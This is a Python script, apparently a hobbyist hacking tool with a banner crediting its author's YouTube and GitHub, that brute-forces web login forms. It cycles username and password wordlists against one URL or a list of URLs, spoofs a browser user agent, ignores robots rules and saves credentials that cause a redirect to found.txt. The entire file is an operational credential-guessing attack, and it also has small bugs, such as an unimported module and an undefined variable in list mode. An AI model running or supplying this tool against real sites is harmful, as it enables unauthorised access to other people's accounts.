from mechanize import Browser
from bs4 import BeautifulSoup
import http.cookiejar as cookielib
import mechanize
from termcolor import colored

logo = '''

█████████╗    ██████╗ ██████╗██╗  ███████████████╗ ██████╗ ██████╗███████╗
██╔════██║    ██╔══████╔═══████║ ██╔██╔════██╔══████╔═██████╔═████╚════██║
█████╗ ██║    ██████╔██║   ███████╔╝█████╗ ██████╔██║██╔████║██╔██║   ██╔╝
██╔══╝ ██║    ██╔═══╝██║   ████╔═██╗██╔══╝ ██╔══██████╔╝██████╔╝██║  ██╔╝ 
████████████████║    ╚██████╔██║  ███████████║  ██╚██████╔╚██████╔╝  ██║  
╚══════╚══════╚═╝     ╚═════╝╚═╝  ╚═╚══════╚═╝  ╚═╝╚═════╝ ╚═════╝   ╚═╝  

My Channel : https://www.youtube.com/channel/UCkmU73jmY7TFUEYF0OGMQFQ
My Github : https://github.com/ElPoker007                                        
'''
def complete(text, state):
    return (glob.glob(text+'*')+[None])[state] + "/"
try:
    print(colored(logo,"green"))
    print(colored("1 For One WebSite | 2 For List WebSites","yellow"))
    while True:
            try:
                cho = input(colored("Enter Your Choice ====> ","red"))
                if cho == "1" or cho == "2":
                    break
                else:
                    continue
            except(KeyboardInterrupt):
                print(colored("\n[!] Good Bye !", "red"))
                exit()
            except:
                continue

    if cho == "1":
        url = input(colored("Enter Your url ===> ","red"))
    else:
        tar = input(colored("Enter Your List ===> ","red")) 
        tq = open(tar,"r")
        targ = tq.readlines()
    userq = input(colored("Enter Your User List ===> ","red"))
    userw = open(userq,"r")
    user = userw.readlines()
    pasq = input(colored("Enter Your Wordlist ===> ","red"))
    pasw = open(pasq,"r")
    pas = pasw.readlines()
    br = Browser()
    cj = cookielib.LWPCookieJar()
    br.set_handle_robots(False)
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    br.set_handle_redirect(True)
    br.set_cookiejar(cj)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-agent','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
    xx = 0
    if cho == "1":
        for users in user:
            for pasw in pas:
                if xx != 1:
                    br.open(str(url.strip()))
                    print(colored("Trying ====> " + str(users.strip()) + ":" + str(pasw.strip()),"yellow"))
                    try:
                        br.select_form(nr=0)
                    except mechanize._mechanize.FormNotFoundError:
                        pass
                        try:
                            br.select_form(nr=1)
                        except mechanize._mechanize.FormNotFoundError:
                            br.select_form(nr=2)
                    try:
                        br.find_control(type="text",nr=0).value = str(users.strip())
                    except mechanize._form_controls.ControlNotFoundError:
                        try:
                            br.find_control(nr=0).value = str(users.strip())
                        except mechanize._form_controls.ControlNotFoundError:
                            try:
                                br.select_form(nr=1)
                                br.find_control(nr=0).value = str(users.strip())
                            except mechanize._form_controls.ControlNotFoundError:
                                br.select_form(nr=2)
                                br.find_control(nr=0)


                    try:
                        br.find_control(type="text",nr=1).value = str(pasw.strip())
                    except mechanize._form_controls.ControlNotFoundError:
                        try:
                            br.find_control(type="password",nr=1).value = str(pasw.strip())
                        except mechanize._form_controls.ControlNotFoundError:
                            br.find_control(nr=1).value = str(pasw.strip())
                    br.submit()
                    if str(br.geturl().strip()) != str(url.strip()):
                        kk = open("found.txt","a")
                        kk.write(str(users.strip())+":"+str(pasw.strip()) + str(url.strip()))
                        kk.write("\n")
                        kk.close()
                        print(colored("Sucess ====> " + str(users.strip())+":"+str(pasw.strip())+ " " + str(url.strip()),"green"))
                        print(colored("Saved In found.txt","yellow"))
                        xx = 1
                    else:
                        pass
                else:
                    exit()
    else:
        for targe in targ:
            xx = 0
            for users in user:
                for pasw in pas:
                    if xx != 1:
                        br.open(str(targe.strip()))
                        print(colored("Trying ====> " + str(users.strip()) + ":" + str(pasw.strip()),"yellow"))
                        try:
                            br.select_form(nr=0)
                        except mechanize._mechanize.FormNotFoundError:
                            try:
                                br.select_form(nr=1)
                            except mechanize._mechanize.FormNotFoundError:
                                br.select_form(nr=2)
                        try:
                            br.find_control(type="text",nr=0).value = str(users.strip())
                        except mechanize._form_controls.ControlNotFoundError:
                            try:
                                br.find_control(nr=0).value = str(users.strip())
                            except mechanize._form_controls.ControlNotFoundError:
                                try:
                                    br.select_form(nr=1)
                                    br.find_control(nr=0).value = str(users.strip())
                                except mechanize._form_controls.ControlNotFoundError:
                                    br.select_form(nr=2)
                                    br.find_control(nr=0)
                        try:
                            br.find_control(type="text",nr=1).value = str(pasw.strip())
                        except mechanize._form_controls.ControlNotFoundError:
                            try:
                                br.find_control(type="password",nr=1).value = str(pasw.strip())
                            except mechanize._form_controls.ControlNotFoundError:
                                br.find_control(nr=1).value = str(pasw.strip())
                        br.submit()
                        #soup = BeautifulSoup(br.response().read(), "html.parser")
                        if str(br.geturl()) != str(targe.strip()):
                            zz = str(users.strip())+":"+str(pasw.strip()) +" "+ str(targe.strip())
                            kk = open("found.txt","a")
                            kk.write(zz)
                            kk.write("\n")
                            kk.close()
                            print(colored("Sucess ====> " + str(users.strip())+":"+str(pasw.strip())+ " " + str(url.strip()) ,"green"))
                            print(colored("Saved In found.txt","yellow"))
                            xx = 1
                        else:
                            pass
                    else:
                        continue
except(KeyboardInterrupt):
    print(colored("\n[!] Good Bye !", "red"))
    exit()
except FileNotFoundError:
    print(colored("File Not Found","red"))
